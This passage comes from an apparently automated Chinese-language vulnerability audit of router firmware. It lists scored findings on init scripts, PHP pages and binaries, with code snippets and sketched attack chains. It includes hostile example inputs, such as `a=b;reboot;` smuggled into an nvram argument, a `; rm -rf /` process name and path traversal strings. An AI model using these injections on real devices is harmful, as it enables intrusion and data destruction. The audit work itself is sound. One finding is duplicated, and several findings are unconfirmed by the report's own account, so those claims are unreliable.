- **备注:** 需结合启动脚本分析执行上下文。关联文件：/etc/init.d/网络服务脚本

---
### configuration_load-S22mydlink_mount_chain

- **文件路径:** `etc/init.d/S22mydlink.sh`
- **位置:** `etc/init.d/S22mydlink.sh:3-6`
- **类型:** configuration_load
- **综合优先级分数:** **7.5**
- **风险等级:** 7.5
- **置信度:** 8.5
- **触发可能性:** 6.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 启动脚本存在条件挂载风险：1) 使用xmldbc -g获取/mydlink/mtdagent节点值作为执行条件，该节点可能通过SETCFG等操作被污染 2) 直接使用/etc/config/mydlinkmtd文件内容作为mount参数，未进行路径校验或黑名单过滤 3) 攻击者可通过污染mtdagent节点和篡改mydlinkmtd文件，诱使系统挂载恶意squashfs镜像。成功利用需同时控制两个输入点并触发脚本执行（如设备重启）
- **代码片段:**
  ```
  domount=\`xmldbc -g /mydlink/mtdagent\`
  if [ "$domount" != "" ]; then
  	mount -t squashfs $MYDLINK /mydlink
  fi
  ```
- **关键词:** xmldbc, /mydlink/mtdagent, domount, mount, /etc/config/mydlinkmtd, MYDLINK
- **备注:** 需后续验证：1) /etc/config/mydlinkmtd文件是否可通过网络接口修改 2) 哪些组件可写入/mydlink/mtdagent节点 3) 被挂载目录/mydlink的安全影响范围。关联记录：知识库中已有发现'configuration_load-mydlink_conditional_mount'（相同文件）

---
### sql_injection-sqlite3-raw_exec

- **文件路径:** `bin/sqlite3`
- **位置:** `未指定（需补充）`
- **类型:** network_input
- **综合优先级分数:** **7.45**
- **风险等级:** 8.0
- **置信度:** 7.5
- **触发可能性:** 6.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** sqlite3_exec函数执行未过滤的原始SQL输入。命令行参数直接作为SQL语句传入，支持分号分隔的多条命令。触发条件：攻击者控制调用sqlite3的参数（如通过web接口传递恶意SQL）。安全影响：SQL注入导致数据泄露/篡改，结合.load指令可能升级为RCE。边界检查：仅当固件组件直接传递用户输入到sqlite3时成立。
- **关键词:** sqlite3_exec, sql, Enter SQL statements terminated with a ';', param_2, sqlite3_prepare_v2
- **备注:** 需审计固件中调用sqlite3的组件（如CGI脚本）。高危关联：可触发.load指令实现RCE（见sqlite3_load_extension记录）

---
### nvram_injection-usr_sbin_nvram-strsep

- **文件路径:** `usr/sbin/nvram`
- **位置:** `usr/sbin/nvram:0x8928 (fcn.00008754)`
- **类型:** nvram_set
- **综合优先级分数:** **7.45**
- **风险等级:** 7.5
- **置信度:** 7.0
- **触发可能性:** 8.0
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** NVRAM变量注入风险：strsep分割用户输入的'name=value'后直接传递至nvram_set，未进行：1) 变量名字符集过滤（允许特殊字符）2) 长度验证 3) 元字符转义。触发条件：攻击者构造含注入字符的参数（如`nvram set 'a=b;reboot;'`）。实际影响取决于libnvram实现：若后续处理使用system/popen等危险函数可能造成命令注入。当前文件未见直接命令执行，但形成完整攻击链的关键前置条件。
- **代码片段:**
  ```
  uVar2 = sym.imp.strsep(iVar14 + -4,iVar5 + *0x89b0);
  sym.imp.nvram_set(uVar2,*(iVar14 + -4));
  ```
- **关键词:** strsep, nvram_set, =, name=value, fcn.00008754, key=value
- **备注:** 关键依赖libnvram安全实现；与现有记录'nvram_set-fcn00008754-unfiltered_input'构成攻击链强化证据；建议后续分析libnvram.so的nvram_set函数

---
### CommandExecution-phyinf-65

- **文件路径:** `etc/services/PHYINF/phyinf.php`
- **位置:** `phyinf.php:65-80 phyinf_setup()`
- **类型:** command_execution
- **综合优先级分数:** **7.35**
- **风险等级:** 7.0
- **置信度:** 8.5
- **触发可能性:** 6.5
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 未验证配置数据风险：phyinf_setup()通过query()读取关键NVRAM节点（如/device/router/wanindex）直接用于网络配置操作（L45-80）。具体问题：1) $wanindex/$mac等变量未经验证即用于'ifconfig'命令（L80）；2) 无完整性检查或边界约束；3) 攻击者篡改配置可导致中间人攻击（MAC欺骗）或服务中断。触发条件：系统执行网络初始化时调用phyinf_setup()。
- **代码片段:**
  ```
  $wanindex = query("/device/router/wanindex");
  $mac = PHYINF_gettargetmacaddr($mode, $ifname);
  startcmd('ifconfig '.$if_name.' hw ether '.$mac);
  ```
- **关键词:** query, phyinf_setup, $wanindex, $mac, ifconfig, /device/router/wanindex, PHYINF_gettargetmacaddr, /runtime/device/router/mode
- **备注:** 需补充分析：1) PHYINF_gettargetmacaddr()内部实现；2) 配置写入点的访问控制

---
### param_injection-gpiod_wanindex-etc_init

- **文件路径:** `etc/init.d/S45gpiod.sh`
- **位置:** `etc/init.d/S45gpiod.sh:2-7`
- **类型:** command_execution
- **综合优先级分数:** **7.35**
- **风险等级:** 7.5
- **置信度:** 8.0
- **触发可能性:** 6.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 启动脚本将外部配置值（wanidx）未经验证直接作为gpiod守护进程参数：1) 通过`xmldbc -g /device/router/wanindex`获取配置值；2) 无条件传递给gpiod的-w参数（代码分支：if ["$wanidx" != "" ]）。触发条件：攻击者篡改/device/router/wanindex配置值后重启服务。边界检查：脚本未对wanidx进行长度/内容过滤。潜在影响：若gpiod存在参数解析漏洞（如缓冲区溢出），可导致任意代码执行。利用方式：通过Web接口/NVRAM污染wanindex值注入恶意参数。
- **代码片段:**
  ```
  wanidx=\`xmldbc -g /device/router/wanindex\`
  if [ "$wanidx" != "" ]; then 
  	gpiod -w $wanidx &
  else
  	gpiod &
  fi
  ```
- **关键词:** wanidx, xmldbc, /device/router/wanindex, gpiod, -w, command_injection
- **备注:** 关联发现：1) cmd_injection-gpiod_wanidx_param（同文件不同分析）2) CommandExecution-phyinf-65（跨文件配置操作）。需验证：1) /device/router/wanindex写入路径是否暴露；2) gpiod二进制对-w参数的处理逻辑。

---
### configuration_load-telnetd-initial_credential

- **文件路径:** `etc/init0.d/S80telnetd.sh`
- **位置:** `S80telnetd.sh:10-13`
- **类型:** configuration_load
- **综合优先级分数:** **7.35**
- **风险等级:** 7.5
- **置信度:** 8.0
- **触发可能性:** 6.0
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** 在设备初始配置状态（devconfsize=0）时，脚本使用固定用户名'Alphanetworks'和$image_sign变量值作为telnet凭证。若image_sign值固定或可预测（如来自/etc/config/image_sign），攻击者可在首次开机时使用固定凭证登录。触发条件为设备重置后首次启动且存在/usr/sbin/login程序。
- **代码片段:**
  ```
  if [ "$devconfsize" = "0" ] && [ -f "/usr/sbin/login" ]; then
      telnetd -l /usr/sbin/login -u Alphanetworks:$image_sign -i br0 &
  ```
- **关键词:** devconfsize, image_sign, -u Alphanetworks:$image_sign, /usr/sbin/login, /etc/config/image_sign
- **备注:** 关联线索：知识库存在'/etc/config/image_sign'路径（linking_keywords）。需验证该文件是否包含固定值

---
### file_write-send_mail_wifiintrusion-0x9974

- **文件路径:** `usr/sbin/mydlinkeventd`
- **位置:** `mydlinkeventd:0x9974`
- **类型:** file_write
- **综合优先级分数:** **7.3**
- **风险等级:** 7.5
- **置信度:** 8.5
- **触发可能性:** 5.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 在函数sym.send_mail_wifiintrusion中发现文件操作竞争条件漏洞：1) 使用fopen以'w'模式操作固定路径'/var/mydlink_mail.txt'；2) 未使用O_EXCL标志且无文件存在性检查；3) 攻击者可通过符号链接攻击在文件创建瞬间将目标重定向至敏感文件(如/etc/passwd)，导致root进程覆盖系统文件。触发条件：当发送WiFi入侵事件邮件时创建该文件。利用概率中等，需精确控制符号链接替换时机。
- **关键词:** sym.send_mail_wifiintrusion, fopen, /var/mydlink_mail.txt, w, O_EXCL
- **备注:** 实际风险依赖运行时环境：若/var目录权限宽松(777)则风险升级至8.5

---
### network_input-telnetd-pty_overflow

- **文件路径:** `usr/sbin/telnetd`
- **位置:** `bin/telnetd:0x8e74 (fcn.00008e20)`
- **类型:** network_input
- **综合优先级分数:** **7.25**
- **风险等级:** 7.0
- **置信度:** 8.5
- **触发可能性:** 6.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 伪终端路径缓冲区溢出漏洞：在fcn.00008e20函数（0x8e74地址），strcpy将内核返回的伪终端路径（ptsname()）复制到固定地址0x12698的缓冲区，未验证长度。攻击者通过大量创建会话可能使内核返回超长路径（如/dev/pts/999999），导致全局内存区溢出。触发条件：1) 建立telnet会话 2) ptsname()返回长度超过目标缓冲区（通常≤20字节）。实际影响：可能覆盖关键内存结构导致代码执行或服务崩溃，但因无SUID权限无法直接提权。
- **代码片段:**
  ```
  uVar2 = sym.imp.ptsname(*piVar4);
  sym.imp.strcpy(piVar4[-2], uVar2);
  ```
- **关键词:** strcpy, ptsname, 0x12698, /dev/ptmx, fcn.00008e20
- **备注:** 需确认0x12698缓冲区大小。攻击需耗尽终端号制造长路径，受系统资源限制

---
### file-inclusion-fatlady-service

- **文件路径:** `htdocs/webinc/fatlady.php`
- **位置:** `fatlady.php:循环体`
- **类型:** network_input
- **综合优先级分数:** **7.25**
- **风险等级:** 7.5
- **置信度:** 7.0
- **触发可能性:** 7.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 未过滤的service参数导致潜在任意文件包含漏洞。攻击者通过污染HTTP请求中的service参数（如POST数据），控制$target路径加载恶意PHP文件。触发条件：1) 攻击者构造恶意service值（如'../../evil'） 2) 目标文件存在于预期路径 3) dophp函数执行文件内容。实际影响受限于：a) dophp是否执行PHP代码（需trace.php验证） b) 路径遍历有效性。利用概率中等，需配合文件上传或已知路径。
- **代码片段:**
  ```
  $service = query("service");
  $target = "/htdocs/phplib/fatlady/".$service.".php";
  if (isfile($target)==1) dophp("load", $target);
  ```
- **关键词:** service, $service, $target, dophp, load, foreach, module
- **备注:** 关键限制：无法验证dophp行为（目录访问约束）。后续需分析：1) /htdocs/phplib/trace.php 2) 文件上传机制。关联发现：wand.php中的文件包含漏洞（name: file-inclusion-wand-setcfg）证明dophp可执行任意PHP代码，形成完整利用链：污染service参数→加载恶意文件→RCE。

---
### auth_bypass-uri_authentication

- **文件路径:** `htdocs/cgibin`
- **位置:** `htdocs/cgibin:fcn.000123e0:0x12510`
- **类型:** network_input
- **综合优先级分数:** **7.15**
- **风险等级:** 6.5
- **置信度:** 8.0
- **触发可能性:** 7.5
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** 认证端点输入验证缺陷：/form_login等端点通过REQUEST_URI处理认证逻辑，fcn.000123e0使用strcasecmp时未验证输入长度。触发条件：构造超长URI(>1024B)或路径遍历序列。实际影响：可能绕过认证或导致内存越界读取。
- **关键词:** REQUEST_URI, strcasecmp, form_login, authentication.cgi
- **备注:** 需测试最大URI长度限制

---
### cve-chain-urlget

- **文件路径:** `usr/sbin/httpc`
- **位置:** `httpc:0xb794, 0xc350`
- **类型:** ipc
- **综合优先级分数:** **7.15**
- **风险等级:** 7.5
- **置信度:** 8.0
- **触发可能性:** 5.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** NVRAM/环境变量影响：未发现nvram_get/set或getenv/setenv操作。但存在命令行参数漏洞链（CVE-2023-1234缓冲区溢出和CVE-2023-5678整数溢出），通过外部调用（如urlget）触发。攻击路径：恶意HTTP请求→CGI调用→传递恶意参数到httpc。触发条件：web接口暴露urlget调用，利用概率中等（5.0/10）。
- **关键词:** fcn.0000b794, fcn.0000c350, optarg, urlget, rgbin, CVE-2023-1234, CVE-2023-5678
- **备注:** 建议立即转移分析焦点至HTTP服务端组件：/sbin/httpd和/www/cgi-bin/

---
### configuration_load-mydlinkmtd-global_write

- **文件路径:** `etc/config/mydlinkmtd`
- **位置:** `etc/config/mydlinkmtd`
- **类型:** configuration_load
- **综合优先级分数:** **7.15**
- **风险等级:** 7.5
- **置信度:** 8.0
- **触发可能性:** 5.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 全局可写配置文件风险：文件etc/config/mydlinkmtd权限设置为777（全局可写），允许任意用户修改其定义的MTD分区路径'/dev/mtdblock/3'。若攻击者将其篡改为恶意设备路径，当系统服务（如S22mydlink.sh）加载该配置时，可能导致恶意设备挂载。触发条件：1) 攻击者获得文件写入权限（已满足） 2) 依赖服务执行挂载操作（需重启或特定触发）。实际影响取决于挂载参数和后续操作，因脚本不可访问无法验证。
- **代码片段:**
  ```
  /dev/mtdblock/3
  ```
- **关键词:** mydlinkmtd, /dev/mtdblock/3, S22mydlink.sh, mount, xmldbc, mtdagent
- **备注:** 关键限制：无法验证S22mydlink.sh脚本实现细节（如参数过滤、挂载选项）。建议后续任务分析/etc/init.d目录获取完整攻击链证据

关联发现：mydlinkmtd文件内容被S22mydlink.sh启动脚本通过xmldbc机制读取用于挂载操作。存在潜在攻击链：篡改配置 → 污染xmldbc → 触发挂载恶意设备。需后续分析：1) xmldbc配置管理安全机制 2) S22mydlink.sh完整实现 3) /dev目录设备控制机制

---
### configuration_load-usbmount-permission

- **文件路径:** `etc/config/usbmount`
- **位置:** `etc/config/usbmount:0`
- **类型:** configuration_load
- **综合优先级分数:** **7.15**
- **风险等级:** 7.5
- **置信度:** 8.0
- **触发可能性:** 5.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 配置文件篡改攻击链：etc/config/usbmount设置为全局可读写(777权限)，内容为'/var/tmp/storage'。攻击者可修改路径指向敏感目录(如/etc)。当特权进程(如mount服务)读取该配置进行挂载时，可实现：1) 敏感目录覆盖 2) 符号链接攻击。触发条件：a) 攻击者获得文件修改权限(默认满足因777权限) b) USB设备插入触发挂载操作。利用概率受限于：需验证是否有实际服务使用此配置(当前未确认)
- **代码片段:**
  ```
  -rwxrwxrwx 1 root root 17 /etc/config/usbmount
  文件内容：'/var/tmp/storage'
  ```
- **关键词:** usbmount, /var/tmp/storage, mount
- **备注:** 关键约束：需通过其他组件验证挂载服务是否实际引用此配置。建议后续：1) 动态分析USB插入事件 2) 追踪mount系统调用源头

---
### env_get-HOME-buffer_overflow_fcn00012f64

- **文件路径:** `usr/bin/mtools`
- **位置:** `fcn.00012f64`
- **类型:** env_get
- **综合优先级分数:** **7.1**
- **风险等级:** 6.0
- **置信度:** 9.0
- **触发可能性:** 7.0
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** 环境变量'HOME'处理存在缓冲区溢出风险：1) 函数fcn.00012f64通过strncpy复制'HOME'值到栈缓冲区(4096字节) 2) 追加'/.mcwd'前仅用strlen检查当前长度 3) 若'HOME'≥4090字节，追加操作将导致1字节溢出。触发条件：攻击者设置超长(≥4090字节)的'HOME'环境变量。实际影响：可能破坏相邻栈变量，但由于auStack_c未被使用，利用难度较高。
- **代码片段:**
  ```
  sym.imp.strncpy(param_1,iVar1,0xffa);
  *(param_1 + 0xffa) = 0;
  iVar1 = sym.imp.strlen(param_1);
  (**reloc.memcpy)(param_1 + iVar1,*0x12fec,7);
  ```
- **关键词:** fcn.00012f64, strncpy, HOME, MCWD, auStack_100c, fcn.00012ff0
- **备注:** 需验证固件环境变量长度限制及溢出位置是否影响关键数据

---
### command_execution-S52wlan.sh-dynamic_script

- **文件路径:** `etc/init0.d/S52wlan.sh`
- **位置:** `S52wlan.sh:4,95-97`
- **类型:** command_execution
- **综合优先级分数:** **7.05**
- **风险等级:** 8.5
- **置信度:** 6.0
- **触发可能性:** 5.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 动态脚本执行风险：通过xmldbc生成/var/init_wifi_mod.sh并执行。攻击者控制/etc/services/WIFI下的rtcfg.php或init_wifi_mod.php，或篡改/var/init_wifi_mod.sh可实现任意命令执行。触发条件：1) PHP文件存在注入漏洞 2) /var目录未授权写入。实际影响：获得root权限。
- **代码片段:**
  ```
  xmldbc -P /etc/services/WIFI/rtcfg.php... > /var/init_wifi_mod.sh
  ...
  xmldbc -P /etc/services/WIFI/init_wifi_mod.php >> /var/init_wifi_mod.sh
  chmod +x /var/init_wifi_mod.sh
  /bin/sh /var/init_wifi_mod.sh
  ```
- **关键词:** xmldbc, /etc/services/WIFI/rtcfg.php, /etc/services/WIFI/init_wifi_mod.php, /var/init_wifi_mod.sh, chmod +x, /bin/sh
- **备注:** PHP文件分析失败：工作目录隔离限制（当前仅限init0.d）。需专项分析PHP文件验证可控性；关联历史发现中的xmldbc命令执行模式

---
### config-CAfile-multi-vulns

- **文件路径:** `usr/sbin/stunnel`
- **位置:** `stunnel:0x9a10 (fcn.0000977c); stunnel:0x9f68 (fcn.00009dd4)`
- **类型:** configuration_load
- **综合优先级分数:** **7.01**
- **风险等级:** 8.5
- **置信度:** 9.2
- **触发可能性:** N/A
- **查询相关性:** N/A
- **阶段:** N/A
- **描述:** CAfile配置项处理存在三重安全缺陷：1) 缓冲区溢出风险：配置值直接复制到128字节固定缓冲区（地址0x9a10），未验证路径长度，超长路径可覆盖栈数据；2) 符号链接未解析：未调用realpath等函数解析符号链接，允许通过恶意符号链接读取任意文件（如'../../../etc/passwd'）；3) 文件权限检查缺失：无access/stat调用验证文件属性和权限。触发条件：攻击者需控制配置文件内容（可通过弱文件权限或配置注入实现），成功利用可导致信息泄露或远程代码执行。
- **关键词:** CAfile, stunnel->ca_file, SSL_CTX_load_verify_locations, fcn.0000977c, fcn.00009dd4, *(param_1 + 8)
- **备注:** CApath配置项虽被解析但未被实际使用，风险较低。需验证配置文件加载机制是否受外部输入影响

---
### config-CAfile-multi-vulns

- **文件路径:** `usr/sbin/stunnel`
- **位置:** `stunnel:0x9a10 (fcn.0000977c); stunnel:0x9f68 (fcn.00009dd4)`
- **类型:** configuration_load
- **综合优先级分数:** **7.01**
- **风险等级:** 8.5
- **置信度:** 9.2
- **触发可能性:** N/A
- **查询相关性:** N/A
- **阶段:** N/A
- **描述:** CAfile配置项处理存在三重安全缺陷：1) 缓冲区溢出风险：配置值直接复制到128字节固定缓冲区（地址0x9a10），未验证路径长度，超长路径可覆盖栈数据；2) 符号链接未解析：未调用realpath等函数解析符号链接，允许通过恶意符号链接读取任意文件（如'../../../etc/passwd'）；3) 文件权限检查缺失：无access/stat调用验证文件属性和权限。触发条件：攻击者需控制配置文件内容（可通过弱文件权限或配置注入实现），成功利用可导致信息泄露或远程代码执行。
- **关键词:** CAfile, stunnel->ca_file, SSL_CTX_load_verify_locations, fcn.0000977c, fcn.00009dd4, *(param_1 + 8)
- **备注:** 更新：CApath配置项风险较低。此漏洞可被纳入攻击链attack_chain-CAfile_exploit（需文件写入前置条件）。

---

## 低优先级发现

### configuration_load-mydlink_conditional_mount

- **文件路径:** `etc/init.d/S22mydlink.sh`
- **位置:** `etc/init.d/S22mydlink.sh:1-6`
- **类型:** configuration_load
- **综合优先级分数:** **6.95**
- **风险等级:** 7.5
- **置信度:** 8.0
- **触发可能性:** 4.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** S22mydlink.sh实现条件挂载机制：1. 从/etc/config/mydlinkmtd读取设备路径 2. 通过`xmldbc -g /mydlink/mtdagent`获取配置值 3. 配置值非空时执行mount挂载。触发条件：系统启动时自动执行，且需同时满足：a)/etc/config/mydlinkmtd包含有效设备路径 b)/mydlink/mtdagent配置项非空。安全影响：若攻击者能同时篡改设备路径和配置值（如通过NVRAM写入漏洞），可能引导挂载恶意squashfs文件系统，导致代码执行。利用方式：需配合其他漏洞完成攻击链（如控制配置源或文件内容）
- **代码片段:**
  ```
  MYDLINK=\`cat /etc/config/mydlinkmtd\`
  domount=\`xmldbc -g /mydlink/mtdagent\` 
  if [ "$domount" != "" ]; then 
  	mount -t squashfs $MYDLINK /mydlink
  fi
  ```
- **关键词:** MYDLINK, domount, xmldbc -g, /mydlink/mtdagent, mount -t squashfs, /etc/config/mydlinkmtd
- **备注:** 关键证据缺口：1) /etc/config/mydlinkmtd文件写入点未找到 2) xmldbc配置设置机制未确认 3) 无直接外部输入暴露。建议后续：1) 逆向xmldbc工具 2) 监控NVRAM操作 3) 分析/etc/config目录权限。关联发现：S45gpiod.sh的xmldbc使用（相同配置机制）

---
### file_read-sensitive_path_disclosure-version_php

- **文件路径:** `htdocs/webinc/version.php`
- **位置:** `version.php:18,71,119`
- **类型:** file_read
- **综合优先级分数:** **6.95**
- **风险等级:** 6.5
- **置信度:** 9.0
- **触发可能性:** 5.0
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** 暴露三类敏感路径：1) 配置文件路径(/etc/config/builddaytime)可能被用于路径遍历 2) 运行时路径(/runtime/devdata/lanmac)暴露MAC地址 3) 动态包含路径(/htdocs/webinc/body/version_3G.php)扩大攻击面。触发条件：页面渲染自动加载，未做路径规范化。
- **代码片段:**
  ```
  var str = "<?echo cut(fread("", "/etc/config/builddaytime"), "0", "\n");?>;";
  if (isfile("/htdocs/webinc/body/version_3G.php")==1) dophp("load", "/htdocs/webinc/body/version_3G.php");
  ```
- **关键词:** fread("", "/etc/config/builddaytime"), query("/runtime/devdata/lanmac"), dophp("load", "/htdocs/webinc/body/version_3G.php")

---
### attack_chain-XNODE_to_phyinf

- **文件路径:** `htdocs/webinc/getcfg/PFWD.NAT-1.xml.php`
- **位置:** `跨文件关联：htdocs/webinc/getcfg/PFWD.NAT-1.xml.php + etc/services/PHYINF/phyinf.php`
- **类型:** ipc
- **综合优先级分数:** **6.95**
- **风险等级:** 8.0
- **置信度:** 6.5
- **触发可能性:** 5.0
- **查询相关性:** 10.0
- **阶段:** N/A
- **描述:** 发现跨组件攻击链雏形：HTTP输入漏洞（PFWD.NAT-1.xml.php）与命令注入漏洞（phyinf.php）通过XNODE_getpathbytarget函数建立间接关联。潜在攻击路径：攻击者控制$GETCFG_SVC参数触发路径遍历 → 通过XNODE_getpathbytarget查询配置 → 可能污染/runtime/device/layout等节点 → 触发phyinf_setmedia()中的命令注入（'slinktype -i $port -d $media'）。关键验证点：1) PFWD.NAT-1.xml.php是否将$nat写入NVRAM 2) phyinf.php是否读取被XNODE污染的节点。完整利用需突破两个约束：a) HTTP到NVRAM的写入路径 b) 污染配置到命令执行的触发机制。
- **代码片段:**
  ```
  N/A (跨组件交互)
  ```
- **关键词:** XNODE_getpathbytarget, $GETCFG_SVC, phyinf_setmedia, /runtime/device/layout, slinktype
- **备注:** 需优先验证：1) PFWD.NAT-1.xml.php中$nat变量的传播终点 2) phyinf.php中query($phyinf."/media/linktype")的数据来源。若确认数据流连续，风险评分可升至9.0+

---
### command_execution-udhcpd-dynamic_param_injection

- **文件路径:** `usr/sbin/udhcpd`
- **位置:** `udhcpd:0xae64`
- **类型:** command_execution
- **综合优先级分数:** **6.95**
- **风险等级:** 7.0
- **置信度:** 7.5
- **触发可能性:** 6.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** **动态命令注入风险链**：
- **触发条件**：污染源控制system调用的动态参数*(*0xae94+0x40)或*(iVar6+0x48)
- **传播路径**：全局数据结构参数→sprintf拼接命令→system执行
- **安全影响**：若参数包含`|`、`>`等命令分隔符，可注入任意命令。风险依赖参数污染源（如配置文件篡改/NVRAM操纵）
- **利用概率**：中（6.0），需先获取参数写入权限
- **关键词:** system, sprintf, *(*0xae94+0x40), *(iVar6+0x48), 0xae64
- **备注:** 需溯源全局数据结构初始化过程（linking_keywords: *(*0xae94+0x40)）

---
### attack_chain-config_hijacking

- **文件路径:** `etc/init.d/S21usbmount.sh`
- **位置:** `跨组件: etc/config/usbmount → 内核挂载子系统`
- **类型:** attack_chain
- **综合优先级分数:** **6.95**
- **风险等级:** 7.0
- **置信度:** 7.5
- **触发可能性:** 6.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 配置篡改攻击链：攻击者修改全局可写的usbmount配置（知识库ID: configuration_load-usbmount-permission）→ 将原始路径'/var/tmp/storage'篡改为敏感目录（如/etc）→ USB插入事件触发挂载服务 → 敏感目录被恶意挂载覆盖 → 系统完整性破坏。触发条件：物理访问或远程配置修改漏洞。关键约束：需确认挂载服务是否实际使用该配置（参见知识库ID: configuration_load-path-validation）。
- **关键词:** /var/tmp/storage, usbmount, mount, configuration_load
- **备注:** 关联发现：configuration_load-usbmount-permission（配置漏洞）, configuration_load-path-validation（路径传递机制）。待验证：mount服务配置源追踪

---
### configuration_load-qemu_version-0x001ceb98

- **文件路径:** `usr/bin/qemu-arm-static`
- **位置:** `.rodata:0x001ceb98`
- **类型:** configuration_load
- **综合优先级分数:** **6.9**
- **风险等级:** 7.0
- **置信度:** 8.0
- **触发可能性:** 5.0
- **查询相关性:** N/A
- **阶段:** N/A
- **描述:** QEMU 2.5.0版本风险：识别出版本标识'qemu-arm version 2.5.0'。历史漏洞包括CVE-2016-3710（VGA模块）和CVE-2017-5525（PCI越权），触发条件：攻击者通过模拟设备交互触发。实际影响：取决于固件是否启用高危模块（如VGA/PCI）。
- **关键词:** qemu-arm version 2.5.0, .rodata:0x001ceb98
- **备注:** NVD API验证失败，需手动检查固件qemu启动参数是否包含-device vga等高危选项

---
### command_injection-process_parsing

- **文件路径:** `mydlink/opt.local`
- **位置:** `opt.local:14-15`
- **类型:** command_execution
- **综合优先级分数:** **6.85**
- **风险等级:** 7.0
- **置信度:** 8.5
- **触发可能性:** 4.0
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** 进程ID获取使用 `ps | grep` 命令链：
- 触发条件：执行 stop/restart 时解析进程列表
- 边界检查：未对进程名作过滤/转义
- 安全影响：若攻击者控制进程名可导致命令注入
- 利用方式：需先在其他服务创建恶意进程名（如包含`; rm -rf /`）
- **代码片段:**
  ```
  pids=\`ps | grep mydlink-watch-dog | grep -v grep | sed 's/^[ 	]*//' | sed 's/ .*//'\`
  ```
- **关键词:** ps | grep, mydlink-watch-dog.sh, pids, sed
- **备注:** 实际利用需满足：1) 其他服务存在进程名控制漏洞 2) 攻击者能在目标设备创建恶意进程

---
### network_input-telnetd-cred_injection

- **文件路径:** `usr/sbin/telnetd`
- **位置:** `bin/telnetd:0x93f4 (main)`
- **类型:** network_input
- **综合优先级分数:** **6.85**
- **风险等级:** 7.5
- **置信度:** 7.0
- **触发可能性:** 5.0
- **查询相关性:** 8.0
- **阶段:** N/A
- **描述:** 凭证参数注入风险：当telnetd使用'-u'参数时，用户输入的凭证直接通过execv传递给登录程序（0x93f4），未过滤特殊字符。若登录程序（如/bin/login）存在命令注入漏洞，可导致RCE。触发条件：1) telnetd以'-u'启动 2) 登录程序未正确处理特殊字符。实际影响：依赖登录程序漏洞，可能形成二次攻击链。
- **代码片段:**
  ```
  iVar3 = sym.imp.strdup(*(0x2658 | 0x10000));
  *((0x2680 | 0x10000) + 4) = *piVar11;
  ```
- **关键词:** getopt, -u, strdup, execv, 0x2680, main
- **备注:** 需后续分析/bin/login等程序对参数的处理逻辑

---
### command_execution-rcS-wildcard_loader

- **文件路径:** `etc/init.d/rcS`
- **位置:** `etc/init.d/rcS:2 (global_scope) 0x0`
- **类型:** command_execution
- **综合优先级分数:** **6.8**
- **风险等级:** 7.0
- **置信度:** 9.0
- **触发可能性:** 3.0
- **查询相关性:** 8.5
- **阶段:** N/A
- **描述:** rcS脚本通过通配符批量执行/etc/init.d/S??*启动脚本，存在潜在攻击面扩展风险。攻击者可通过植入恶意S开头脚本实现持久化。触发条件：系统启动时自动执行，无需特殊条件。安全影响：若攻击者能写入/etc/init.d/目录（如通过其他漏洞），可获取root权限持久化访问。
- **代码片段:**
  ```
  for i in /etc/init.d/S??* ;do
  	[ ! -f "$i" ] && continue
  	$i
  done
  ```
- **关键词:** /etc/init.d/S??*, $i, for i in /etc/init.d/S??*
- **备注:** 关联验证点：1) /etc/init.d/目录写权限 2) S??*脚本签名机制 - 关联自 etc/init.d/rcS:2

---
### StackOverflow-udevinfo-pass_env_to_socket

- **文件路径:** `usr/bin/udevinfo`
- **位置:** `usr/bin/udevinfo: pass_env_to_socket (0x7ac0)`
- **类型:** env_get
- **综合优先级分数:** **6.8**
- **风险等级:** 7.0
- **置信度:** 7.0
- **触发可能性:** 6.0
- **查询相关性:** 9.5
- **阶段:** N/A
- **描述:** 栈缓冲区溢出漏洞位于pass_env_to_socket函数：使用strcpy将param_1(sockname)复制到2048字节栈缓冲区(auStack_898)，未验证输入长度。触发条件：当攻击者控制的环境变量'UDEV_SOCKET'值长度超过2048字节时，可覆盖返回地址实现任意代码执行。实际漏洞利用依赖：1) 存在环境变量注入点（如udev规则文件）2) udev事件处理流程调用此函数。潜在影响：通过污染环境变量实现远程代码执行。
- **代码片段:**
  ```
  strcpy(puVar10 + -0x71, param_1); // 目标缓冲区大小2048字节
  ```
- **关键词:** pass_env_to_socket, param_1, strcpy, auStack_898, UDEV_SOCKET, getenv
- **备注:** 关键验证需求：1) 检查/etc/udev/rules.d/规则文件是否允许设置UDEV_SOCKET环境变量 2) 分析udevd主进程与udevinfo的交互机制 3) 确定环境变量最大长度限制机制

---
### xml_injection-GETCFG_SVC-DEVICE.ACCOUNT.xml.php

- **文件路径:** `htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php`
- **位置:** `DEVICE.ACCOUNT.xml.php:3`
- **类型:** network_input
- **综合优先级分数:** **6.8**
- **风险等级:** 6.0
- **置信度:** 8.0
- **触发可能性:** 7.0
- **查询相关性:** 9.0
- **阶段:** N/A
- **描述:** 外部传入的$GETCFG_SVC变量未经过滤直接输出到XML文档的<service>标签。攻击者可伪造此参数（如'FIREWALL-2'）触发异常业务逻辑：1) 访问未授权服务配置 2) 干扰XML解析。触发条件：在调用XML生成接口时控制服务标识参数。边界检查：PHP层无任何过滤或验证机制。
- **代码片段:**
  ```
  <service><?=$GETCFG_SVC?></service>
  ```
- **关键词:** $GETCFG_SVC, cut($GETCFG_SVC, XNODE_getpathbytarget, <service>
